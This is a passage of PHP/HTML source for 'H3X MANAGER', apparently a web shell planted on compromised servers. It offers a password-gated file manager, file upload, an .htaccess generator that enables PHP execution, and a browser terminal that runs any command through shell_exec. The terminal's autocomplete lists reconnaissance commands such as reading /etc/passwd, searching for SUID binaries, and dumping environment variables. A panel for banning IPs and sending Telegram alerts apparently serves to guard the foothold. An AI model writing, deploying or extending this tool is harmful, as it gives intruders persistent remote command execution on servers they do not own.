.ver{font-size:11px;color:
</style></head><body>
<div class="card">
  <div class="logo-icon">⬡</div>
  <div class="logo">H3X <span>MANAGER</span></div>
  <div class="sub">File Manager v<?= FM_VERSION ?></div>
  <form method="post">
    <input type="password" name="password" placeholder="Enter password" autofocus>
    <button type="submit">LOGIN</button>
    <?php if($err): ?><div class="err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
  </form>
</div></body></html>
<?php }
$files = [];
if (is_dir($path)) {
    foreach (scandir($path) as $f) {
        if ($f === '.') continue;
        $fp = $path . '/' . $f;
        $files[] = ['name'=>$f,'full'=>$fp,'isdir'=>is_dir($fp),'size'=>is_file($fp)?filesize($fp):0,'perms'=>substr(sprintf('%o',fileperms($fp)),-4),'mtime'=>filemtime($fp)];
    }
    usort($files, fn($a,$b) => $b['isdir']-$a['isdir'] ?: strcmp($a['name'],$b['name']));
}
$rel    = rel_path($path, $root);
$parts  = $rel ? explode('/', $rel) : [];
$breadcrumbs = []; $built = '';
foreach ($parts as $p) { $built .= ($built?'/':'').$p; $breadcrumbs[] = ['name'=>$p,'path'=>$built]; }
?>
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>H3X MANAGER</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:
a{text-decoration:none;color:inherit;}
.topbar{background:
.topbar .logo{font-size:20px;font-weight:900;letter-spacing:2px;}
.topbar .logo span{color:
.topbar .actions{display:flex;gap:10px;align-items:center;}
.topbar .actions a,.topbar .actions button{background:rgba(255,255,255,.1);color:
.topbar .actions a:hover,.topbar .actions button:hover{background:
.main{max-width:1200px;margin:0 auto;padding:20px 16px;}
.breadcrumb{background:
.breadcrumb a{color:
.breadcrumb span{color:
.msg{background:
.sinfo{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px;}
.sinfo-card{background:
.sinfo-card .si-icon{font-size:18px;}
.sinfo-card .si-label{color:
.sinfo-card .si-val{font-weight:700;color:
.toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center;}
.toolbar form{display:flex;gap:6px;align-items:center;}
.toolbar input[type=text]{padding:8px 12px;border:1.5px solid 
.toolbar input[type=text]:focus{border-color:
.btn{padding:8px 16px;border:none;border-radius:7px;cursor:pointer;font-size:13px;font-weight:600;transition:.2s;}
.btn-primary{background:
.btn-green{background:
.btn-red{background:
.btn-gray{background:
.btn-term{background:
.upload-box{background:
.upload-box:hover{border-color:
.upload-box input{display:none;}
.upload-box label{cursor:pointer;display:block;}
.upload-box .upload-icon{font-size:32px;margin-bottom:6px;}
.upload-box p{color:
.file-table{background:
.file-table table{width:100%;border-collapse:collapse;}
.file-table thead th{background:
.file-table tbody tr{border-bottom:1px solid 
.file-table tbody tr:hover{background:
.file-table tbody tr:last-child{border-bottom:none;}
.file-table td{padding:10px 14px;vertical-align:middle;}
.file-icon{font-size:18px;margin-right:8px;}
.fname{font-weight:600;color:
.fdir .fname{color:
.fsize,.fperms,.fdate{color:
.file-actions{display:flex;gap:5px;flex-wrap:wrap;}
.file-actions button,.file-actions a{padding:4px 10px;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;transition:.15s;}
.act-edit{background:
.act-rename{background:
.act-dl{background:
.act-chmod{background:
.act-del{background:
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:999;align-items:center;justify-content:center;}
.modal-bg.active{display:flex;}
.modal{background:
.modal h3{font-size:16px;font-weight:700;margin-bottom:16px;color:
.modal input[type=text]{width:100%;padding:10px 12px;border:1.5px solid 
.modal input[type=text]:focus{border-color:
.modal .modal-actions{display:flex;gap:8px;justify-content:flex-end;}
.editor-box{background:
.editor-box h3{font-size:15px;font-weight:700;margin-bottom:12px;color:
.editor-box textarea{width:100%;height:420px;padding:14px;border:1.5px solid 
.editor-box textarea:focus{border-color:
.editor-actions{display:flex;gap:8px;margin-top:10px;}

.terminal-wrap{background:
.terminal-titlebar{background:
.terminal-titlebar span{color:
.terminal-titlebar .t-dots{display:flex;gap:6px;}
.terminal-titlebar .t-dots i{width:12px;height:12px;border-radius:50%;display:inline-block;}
.t-red{background:
.terminal-output{background:
.terminal-output .t-line-cmd{color:
.terminal-output .t-line-out{color:
.terminal-output .t-line-err{color:
.terminal-input-row{display:flex;align-items:center;background:
.terminal-prompt{color:
.terminal-input{flex:1;background:transparent;border:none;outline:none;color:
.terminal-send{background:
.terminal-send:hover{background:
.terminal-clear{background:
.terminal-clear:hover{background:
@media(max-width:600px){.fsize,.fperms,.fdate{display:none;}.toolbar{flex-direction:column;align-items:stretch;}.toolbar form{flex-direction:column;}}
</style></head><body>
<div class="topbar">
  <div class="logo">
    <div class="logo-icon">⬡</div>
    <div class="logo-text">H3X <span>MANAGER</span></div>
  </div>
  <div class="actions">
    <button class="btn-term-top" onclick="toggleTerminal()">⌨ Terminal</button>
    <span style="color:#3d6b52;font-size:12px;font-family:'JetBrains Mono',monospace;"><?= htmlspecialchars($rel ?: '/') ?></span>
    <a href="?logout=1">Logout</a>
  </div>
</div>
<div class="main">
<?php if ($msg): ?><div class="msg">✓ <?= htmlspecialchars($msg) ?></div><?php endif; ?>
<!-- BREADCRUMB -->
<div class="breadcrumb">
  <a href="?path=.">🏠 Root</a>
  <?php foreach ($breadcrumbs as $bc): ?>
    <span>›</span><a href="?path=<?= urlencode($bc['path']) ?>"><?= htmlspecialchars($bc['name']) ?></a>
  <?php endforeach; ?>
</div>
<?php if ($edit_file): ?>
<div class="editor-box">
  <h3>✏️ Editing: <?= htmlspecialchars(basename($edit_file)) ?></h3>
  <form method="post">
    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
    <textarea name="edit_content"><?= htmlspecialchars($edit_content) ?></textarea>
    <div class="editor-actions">
      <button type="submit" class="btn btn-green">💾 Save</button>
      <a href="?path=<?= urlencode($rel) ?>" class="btn btn-gray">✕ Cancel</a>
    </div>
  </form>
</div>
<?php endif; ?>
<!-- SERVER INFO -->
<div class="sinfo">
  <div class="sinfo-card"><div class="si-icon">🖥️</div><div><div class="si-label">OS</div><div class="si-val"><?= php_uname('s').' '.php_uname('r') ?></div></div></div>
  <div class="sinfo-card"><div class="si-icon">🌐</div><div><div class="si-label">Server IP</div><div class="si-val"><?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()) ?></div></div></div>
  <div class="sinfo-card"><div class="si-icon">⚙️</div><div><div class="si-label">PHP</div><div class="si-val"><?= PHP_VERSION ?></div></div></div>
  <div class="sinfo-card"><div class="si-icon">💾</div><div><div class="si-label">Disk Free</div><div class="si-val"><?= round(disk_free_space('/')/1073741824,1) ?> GB / <?= round(disk_total_space('/')/1073741824,1) ?> GB</div></div></div>
  <div class="sinfo-card"><div class="si-icon">👤</div><div><div class="si-label">User</div><div class="si-val"><?= get_current_user() ?></div></div></div>
  <div class="sinfo-card"><div class="si-icon">🛡️</div><div><div class="si-label">Banned IPs</div><div class="si-val"><?= count($__banned ?? []) ?></div></div></div>
  <div class="sinfo-card"><div class="si-icon">📋</div><div><div class="si-label">Your IP</div><div class="si-val"><?= $__ip ?? $_SERVER['REMOTE_ADDR'] ?></div></div></div>
</div>

<?php if (!empty($__banned)): ?>
<div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:16px;">
  <div style="color:var(--green);font-weight:700;margin-bottom:10px;font-size:13px;">🚫 BANNED IPs</div>
  <table style="width:100%;border-collapse:collapse;font-size:12px;font-family:'JetBrains Mono',monospace;">
    <tr style="color:var(--text3);border-bottom:1px solid var(--border);"><th style="padding:6px;text-align:left;">IP</th><th style="padding:6px;text-align:left;">Reason</th><th style="padding:6px;text-align:left;">Until</th><th style="padding:6px;text-align:left;">Action</th></tr>
    <?php foreach ($__banned as $__bip => $__bdata): ?>
    <tr style="border-bottom:1px solid rgba(26,58,58,.3);color:var(--text2);">
      <td style="padding:6px;"><?= htmlspecialchars($__bip) ?></td>
      <td style="padding:6px;color:var(--red);"><?= htmlspecialchars($__bdata['reason'] ?? '') ?></td>
      <td style="padding:6px;"><?= date('Y-m-d H:i', $__bdata['until'] ?? 0) ?></td>
      <td style="padding:6px;"><a href="?fm_unban_ip=<?= urlencode($__bip) ?>" style="color:var(--green);font-size:11px;">Unban</a></td>
    </tr>
    <?php endforeach; ?>
  </table>
</div>
<?php endif; ?>

<div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:16px;">
  <div style="color:var(--green);font-weight:700;font-size:13px;margin-bottom:12px;display:flex;align-items:center;gap:8px;">🛡️ DEFEND PANEL</div>
  <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
    <a href="?fm_wl_ip=<?= $_SERVER['REMOTE_ADDR'] ?>" class="btn btn-green" style="font-size:12px;padding:6px 14px;">✓ Whitelist My IP</a>
    <a href="?fm_ban_ip=<?= $_SERVER['REMOTE_ADDR'] ?>" class="btn btn-red" style="font-size:12px;padding:6px 14px;" onclick="return confirm('Ban your own IP?')">🚫 Test Ban</a>
    <?php $__logsize = file_exists($__logfile) ? round(filesize($__logfile)/1024,1) : 0; ?>
    <span style="color:var(--text3);font-size:12px;font-family:'JetBrains Mono',monospace;">📋 Log: <?= $__logsize ?> KB</span>
    <?php if(file_exists($__logfile)): ?>
    <a href="?path=.&download=<?= urlencode(basename($__logfile)) ?>" class="btn btn-primary" style="font-size:12px;padding:6px 14px;">⬇ Download Log</a>
    <?php endif; ?>
  </div>
  <div style="border-top:1px solid var(--border);padding-top:12px;">
    <div style="color:var(--text2);font-size:12px;margin-bottom:10px;display:flex;align-items:center;gap:6px;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" style="width:16px;height:16px;"> <b>Telegram Alert Config</b>
      <span style="color:var(--text3);font-size:11px;">(notif otomatis kalau file kena hapus/edit)</span>
    </div>
    <form method="post" style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
      <input type="text" name="tg_token" placeholder="🤖 Bot Token" value="<?= htmlspecialchars($__tgconf_data['token'] ?? '') ?>" style="padding:7px 12px;border:1px solid var(--border);border-radius:7px;background:var(--bg3);color:var(--text);font-size:12px;outline:none;width:280px;">
      <input type="text" name="tg_chatid" placeholder="💬 Chat ID" value="<?= htmlspecialchars($__tgconf_data['chatid'] ?? '') ?>" style="padding:7px 12px;border:1px solid var(--border);border-radius:7px;background:var(--bg3);color:var(--text);font-size:12px;outline:none;width:160px;">
      <button type="submit" name="tg_save" value="1" class="btn btn-green" style="font-size:12px;padding:6px 14px;">💾 Save</button>
      <?php if(!empty($__tgconf_data['token'])): ?>
      <span style="color:var(--green);font-size:11px;">✓ Telegram aktif</span>
      <?php else: ?>
      <span style="color:var(--text3);font-size:11px;">⚠ Belum dikonfigurasi</span>
      <?php endif; ?>
    </form>
    <div style="color:var(--text3);font-size:11px;margin-top:8px;">Cara dapat Chat ID: chat ke @userinfobot di Telegram</div>
  </div>
</div>
<!-- TERMINAL -->
<div class="terminal-wrap" id="terminalWrap" style="display:none;">
  <div class="terminal-titlebar">
    <div class="t-title">⌨ &nbsp;H3X TERMINAL</div>
    <div class="t-dots"><i class="t-red"></i><i class="t-yellow"></i><i class="t-green-dot"></i></div>
  </div>
  <div class="terminal-output" id="termOutput"><span style="color:#00b386;">H3X MANAGER Terminal Ready. Type your command below.
</span></div>
  <div class="terminal-input-row">
    <span class="terminal-prompt" id="termPrompt"><?= htmlspecialchars(getcwd()) ?> $&nbsp;</span>
    <input type="text" class="terminal-input" id="termInput" placeholder="Enter command..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
    <button class="terminal-clear" onclick="clearTerminal()">Clear</button>
    <button class="terminal-send" onclick="runCommand()">Run</button>
  </div>
</div>
<!-- TOOLBAR -->
<div class="toolbar">
  <form method="post"><input type="text" name="new_folder" placeholder="Folder name"><button type="submit" class="btn btn-primary">+ Folder</button></form>
  <form method="post"><input type="text" name="new_file" placeholder="File name"><button type="submit" class="btn btn-green">+ File</button></form>
  <form method="post">
    <button type="submit" name="gen_htaccess" value="1" class="btn btn-primary" title="Fix PHP file ke-download, generate .htaccess PHP handler">⚙ Fix PHP Execute</button>
  </form>
</div>
<!-- UPLOAD -->
<div class="upload-box">
  <form method="post" enctype="multipart/form-data" id="uploadForm">
    <label for="fileInput">
      <div class="upload-icon">📂</div>
      <p>Click to select files or drag & drop here</p>
      <button type="button" class="btn btn-primary" onclick="document.getElementById('fileInput').click()">Choose Files</button>
    </label>
    <input type="file" id="fileInput" name="upload[]" multiple onchange="document.getElementById('uploadForm').submit()">
  </form>
</div>
<!-- FILE TABLE -->
<div class="file-table">
  <table>
    <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
    <tbody>
    <?php foreach ($files as $f): ?>
      <?php
        $fname   = $f['name'];
        $isdir   = $f['isdir'];
        $subpath = ($rel ? $rel.'/' : '').$fname;
        $icon    = $isdir ? '📁' : (preg_match('/\.(jpg|jpeg|png|gif|webp|svg)$/i',$fname)?'🖼️':(preg_match('/\.(php|js|html|css|py|sh|json|xml|txt|log|ini|conf)$/i',$fname)?'📄':(preg_match('/\.(zip|tar|gz|rar)$/i',$fname)?'🗜️':'📎')));
      ?>
      <tr class="<?= $isdir?'fdir':'' ?>">
        <td><span class="file-icon"><?= $icon ?></span><span class="fname"><?php if($isdir):?><a href="?path=<?= urlencode($subpath) ?>"><?= htmlspecialchars($fname) ?></a><?php else:?><?= htmlspecialchars($fname) ?><?php endif;?></span></td>
        <td class="fsize"><?= $isdir?'-':human_size($f['size']) ?></td>
        <td class="fperms"><?= $f['perms'] ?></td>
        <td class="fdate"><?= date('Y-m-d H:i',$f['mtime']) ?></td>
        <td>
          <div class="file-actions">
            <?php if(!$isdir && $fname!=='..'):?>
              <a href="?path=<?= urlencode($rel) ?>&edit=<?= urlencode($fname) ?>" class="act-edit">Edit</a>
              <a href="?path=<?= urlencode($rel) ?>&download=<?= urlencode($fname) ?>" class="act-dl">Download</a>
            <?php endif;?>
            <?php if($fname!=='..'):?>
              <button class="act-rename" onclick="openRename('<?= htmlspecialchars(addslashes($fname)) ?>')">Rename</button>
              <button class="act-chmod" onclick="openChmod('<?= htmlspecialchars(addslashes($fname)) ?>','<?= $f['perms'] ?>')">Chmod</button>
              <a href="?path=<?= urlencode($rel) ?>&delete=<?= urlencode($fname) ?>" class="act-del" onclick="return confirm('Delete <?= htmlspecialchars($fname) ?>?')">Delete</a>
            <?php endif;?>
          </div>
        </td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table>
</div>
</div>
<!-- RENAME MODAL -->
<div class="modal-bg" id="renameModal">
  <div class="modal"><h3>✏️ Rename</h3>
    <form method="post">
      <input type="hidden" name="rename_from" id="renameFrom">
      <input type="text" name="rename_to" id="renameTo" placeholder="New name">
      <div class="modal-actions"><button type="button" class="btn btn-gray" onclick="closeModal('renameModal')">Cancel</button><button type="submit" class="btn btn-primary">Rename</button></div>
    </form>
  </div>
</div>
<!-- CHMOD MODAL -->
<div class="modal-bg" id="chmodModal">
  <div class="modal"><h3>🔐 Chmod</h3>
    <form method="post">
      <input type="hidden" name="chmod_file" id="chmodFile">
      <input type="text" name="chmod_val" id="chmodVal" placeholder="e.g. 0755">
      <div class="modal-actions"><button type="button" class="btn btn-gray" onclick="closeModal('chmodModal')">Cancel</button><button type="submit" class="btn btn-primary">Apply</button></div>
    </form>
  </div>
</div>
<script>
var termCwd = '<?= addslashes(getcwd()) ?>';
var cmdHistory = [], histIdx = -1, tabCandidates = [], tabIdx = 0;
var BUILTINS = ['clear','help','history','pwd','whoami','id','uname -a','ls -la','ps aux','netstat -tlnp','cat /etc/passwd','cat /etc/os-release','find / -perm -4000 2>/dev/null','df -h','free -m','ifconfig','ip a','env','printenv','w','last','ss -tlnp'];
function toggleTerminal() {
    var w = document.getElementById('terminalWrap');
    w.style.display = w.style.display === 'none' ? 'block' : 'none';
    if (w.style.display === 'block') {
        document.getElementById('termInput').focus();
        printWelcome();
    }
}
function printWelcome() {
    var out = document.getElementById('termOutput');
    if (out.dataset.welcomed) return;
    out.dataset.welcomed = '1';
    var info = [
        '<span style="color:#00b386;font-weight:bold;">╔══════════════════════════════════════╗</span>',
        '<span style="color:#00b386;font-weight:bold;">║       H3X MANAGER - TERMINAL         ║</span>',
        '<span style="color:#00b386;font-weight:bold;">╚══════════════════════════════════════╝</span>',
        '<span style="color:#aaa;">Type <span style="color:#00b386;">help</span> for available commands</span>',
        '<span style="color:#aaa;">Tab autocomplete | ↑↓ history | Ctrl+L clear</span>',
        '',
    ].join('\n');
    out.innerHTML = info;
}
function clearTerminal() {
    var out = document.getElementById('termOutput');
    out.innerHTML = '';
    out.dataset.welcomed = '';
    printWelcome();
}
function escHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function appendOutput(prompt, cmd, output, isErr) {
    var out = document.getElementById('termOutput');
    if (prompt && cmd) out.innerHTML += '<span style="color:#00b386;">' + escHtml(prompt) + '</span> <span style="color:#fff;font-weight:bold;">' + escHtml(cmd) + '</span>\n';
    if (output !== undefined && output !== '') {
        out.innerHTML += '<span style="color:' + (isErr ? '#ff7b72' : '#e6edf3') + ';">' + escHtml(output) + '</span>\n';
    }
    out.scrollTop = out.scrollHeight;
}
function showHelp() {
    var help = [
        '<span style="color:#00b386;font-weight:bold;">═══ BUILT-IN COMMANDS ═══</span>',
        '<span style="color:#ffd700;">help</span>         Show this help',
        '<span style="color:#ffd700;">clear</span>        Clear terminal',
        '<span style="color:#ffd700;">history</span>      Show command history',
        '<span style="color:#ffd700;">pwd</span>          Print working directory',
        '',
        '<span style="color:#00b386;font-weight:bold;">═══ SYSTEM INFO ═══</span>',
        '<span style="color:#ffd700;">whoami</span>       Current user',
        '<span style="color:#ffd700;">id</span>           User/group info',
        '<span style="color:#ffd700;">uname -a</span>     Kernel info',
        '<span style="color:#ffd700;">cat /etc/os-release</span>  OS info',
        '<span style="color:#ffd700;">env</span>          Environment vars',
        '<span style="color:#ffd700;">ps aux</span>       Running processes',
        '<span style="color:#ffd700;">free -m</span>      Memory usage',
        '<span style="color:#ffd700;">df -h</span>        Disk usage',
        '',
        '<span style="color:#00b386;font-weight:bold;">═══ NETWORK ═══</span>',
        '<span style="color:#ffd700;">ifconfig / ip a</span>    Interfaces',
        '<span style="color:#ffd700;">netstat -tlnp</span>      Open ports',
        '<span style="color:#ffd700;">ss -tlnp</span>           Socket stats',
        '<span style="color:#ffd700;">curl [url]</span>         HTTP request',
        '<span style="color:#ffd700;">wget [url]</span>         Download file',
        '',
        '<span style="color:#00b386;font-weight:bold;">═══ FILE OPS ═══</span>',
        '<span style="color:#ffd700;">ls / ls -la</span>    List files',
        '<span style="color:#ffd700;">cat [file]</span>     Read file',
        '<span style="color:#ffd700;">find / -perm -4000</span>  Find SUID',
        '<span style="color:#ffd700;">chmod [perm] [file]</span> Change perms',
        '<span style="color:#ffd700;">cp / mv / rm</span>   File operations',
        '',
        '<span style="color:#aaa;">All Linux commands supported via shell_exec</span>',
    ].join('\n');
    var out = document.getElementById('termOutput');
    out.innerHTML += help + '\n\n';
    out.scrollTop = out.scrollHeight;
}
function showHistory() {
    var out = document.getElementById('termOutput');
    if (cmdHistory.length === 0) { out.innerHTML += '<span style="color:#aaa;">No history yet.</span>\n'; return; }
    var h = cmdHistory.slice().reverse().map((c,i) => '<span style="color:#aaa;">' + (i+1) + '</span>  ' + escHtml(c)).join('\n');
    out.innerHTML += h + '\n';
    out.scrollTop = out.scrollHeight;
}
function runCommand() {
    var input = document.getElementById('termInput');
    var cmd = input.value.trim();
    if (!cmd) return;
    if (cmdHistory[0] !== cmd) cmdHistory.unshift(cmd);
    if (cmdHistory.length > 200) cmdHistory.pop();
    histIdx = -1;
    input.value = '';
    tabCandidates = []; tabIdx = 0;
    var prompt = termCwd + ' $';
    if (cmd === 'clear') { clearTerminal(); return; }
    if (cmd === 'help') { appendOutput(prompt, cmd, '', false); showHelp(); return; }
    if (cmd === 'history') { appendOutput(prompt, cmd, '', false); showHistory(); return; }
    appendOutput(prompt, cmd, '', false);
    var fd = new FormData();
    fd.append('terminal_cmd', cmd);
    fd.append('terminal_cwd', termCwd);
    var sendBtn = document.querySelector('.terminal-send');
    sendBtn.textContent = '...';
    sendBtn.disabled = true;
    fetch(window.location.href, { method: 'POST', body: fd })
        .then(r => r.json())
        .then(data => {
            termCwd = data.cwd || termCwd;
            document.getElementById('termPrompt').textContent = termCwd + ' $ ';
            if (data.output !== undefined && data.output !== '') {
                appendOutput('', '', data.output, false);
            }
        })
        .catch(e => appendOutput('', '', '[!] Error: ' + e, true))
        .finally(() => { sendBtn.textContent = 'Run'; sendBtn.disabled = false; document.getElementById('termInput').focus(); });
}
document.getElementById('termInput').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        runCommand();
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx < cmdHistory.length - 1) { histIdx++; this.value = cmdHistory[histIdx]; this.setSelectionRange(this.value.length, this.value.length); }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (histIdx > 0) { histIdx--; this.value = cmdHistory[histIdx]; } else { histIdx = -1; this.value = ''; }
    } else if (e.key === 'Tab') {
        e.preventDefault();
        var val = this.value;
        if (tabCandidates.length === 0) {
            tabCandidates = BUILTINS.filter(c => c.startsWith(val));
            tabIdx = 0;
        }
        if (tabCandidates.length > 0) { this.value = tabCandidates[tabIdx % tabCandidates.length]; tabIdx++; }
    } else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault(); clearTerminal();
    } else if (e.key === 'c' && e.ctrlKey) {
        e.preventDefault(); this.value = ''; appendOutput('', '', '^C', false);
    } else {
        tabCandidates = []; tabIdx = 0;
    }
});
function openRename(name) { document.getElementById('renameFrom').value=name; document.getElementById('renameTo').value=name; document.getElementById('renameModal').classList.add('active'); document.getElementById('renameTo').focus(); }
function openChmod(name,perms) { document.getElementById('chmodFile').value=name; document.getElementById('chmodVal').value=perms; document.getElementById('chmodModal').classList.add('active'); document.getElementById('chmodVal').focus(); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
document.querySelectorAll('.modal-bg').forEach(m => { m.addEventListener('click', e => { if(e.target===m) m.classList.remove('active'); }); });
const uploadBox = document.querySelector('.upload-box');
uploadBox.addEventListener('dragover', e => { e.preventDefault(); uploadBox.style.borderColor='#00b386'; });
uploadBox.addEventListener('dragleave', () => { uploadBox.style.borderColor=''; });
uploadBox.addEventListener('drop', e => {
    e.preventDefault(); uploadBox.style.borderColor='';
    const dt = new DataTransfer();
    [...e.dataTransfer.files].forEach(f => dt.items.add(f));
    document.getElementById('fileInput').files = dt.files;
    document.getElementById('uploadForm').submit();
});
</script>
</body></html>
